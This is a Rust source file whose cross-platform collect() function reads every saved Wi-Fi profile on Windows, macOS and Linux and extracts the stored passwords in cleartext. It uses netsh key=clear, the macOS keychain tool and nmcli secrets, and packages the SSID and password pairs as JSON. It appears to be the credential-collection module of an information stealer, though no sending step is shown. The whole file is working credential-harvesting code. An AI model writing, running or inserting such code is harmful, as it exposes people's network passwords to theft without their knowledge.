use serde_json::{Value, json};

#[cfg(target_os = "windows")]
pub fn collect() -> Value {
    use std::process::Command;
    let output = Command::new("netsh")
        .args(["wlan", "show", "profiles"])
        .output();
    let Ok(output) = output else {
        return Value::Array(vec![]);
    };
    let text = String::from_utf8_lossy(&output.stdout);
    let ssids: Vec<String> = text
        .lines()
        .filter_map(|line| {
            let line = line.trim();
            if let Some(pos) = line.find(':') {
                let key = line[..pos].trim().to_lowercase();
                if key.contains("all user profile") || key.contains("user profile") {
                    return Some(line[pos + 1..].trim().to_string());
                }
            }
            None
        })
        .collect();
    let profiles: Vec<Value> = ssids
        .iter()
        .map(|ssid| {
            let key_output = Command::new("netsh")
                .args([
                    "wlan",
                    "show",
                    "profile",
                    &format!("name={ssid}"),
                    "key=clear",
                ])
                .output();
            let password = key_output
                .ok()
                .and_then(|o| {
                    let text = String::from_utf8_lossy(&o.stdout).into_owned();
                    text.lines()
                        .find(|l| l.trim().to_lowercase().contains("key content"))
                        .and_then(|l| l.split(':').nth(1).map(|s| s.trim().to_string()))
                })
                .unwrap_or_default();
            json!({ "ssid": ssid, "password": password })
        })
        .collect();
    Value::Array(profiles)
}

#[cfg(target_os = "macos")]
pub fn collect() -> Value {
    use std::process::Command;
    let list_output = Command::new("networksetup")
        .args(["-listpreferredwirelessnetworks", "en0"])
        .output();
    let ssids: Vec<String> = list_output
        .ok()
        .map(|o| {
            String::from_utf8_lossy(&o.stdout)
                .lines()
                .skip(1)
                .map(|l| l.trim().to_string())
                .filter(|l| !l.is_empty())
                .collect()
        })
        .unwrap_or_default();
    let profiles: Vec<Value> = ssids
        .iter()
        .map(|ssid| {
            let pw_output = Command::new("security")
                .args(["find-generic-password", "-wa", ssid])
                .output();
            let password = pw_output
                .ok()
                .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
                .unwrap_or_default();
            json!({ "ssid": ssid, "password": password })
        })
        .collect();
    Value::Array(profiles)
}

#[cfg(target_os = "linux")]
pub fn collect() -> Value {
    use std::process::Command;
    let output = Command::new("nmcli")
        .args(["-t", "-f", "NAME,TYPE", "connection", "show"])
        .output();
    let Ok(output) = output else {
        return Value::Array(vec![]);
    };
    let profiles: Vec<Value> = String::from_utf8_lossy(&output.stdout)
        .lines()
        .filter(|l| l.ends_with(":802-11-wireless"))
        .filter_map(|l| {
            let name = l.split(':').next()?.to_string();
            let pw_output = Command::new("nmcli")
                .args([
                    "-s",
                    "-g",
                    "802-11-wireless-security.psk",
                    "connection",
                    "show",
                    &name,
                ])
                .output()
                .ok()?;
            let password = String::from_utf8_lossy(&pw_output.stdout)
                .trim()
                .to_string();
            Some(json!({ "ssid": name, "password": password }))
        })
        .collect();
    Value::Array(profiles)
}
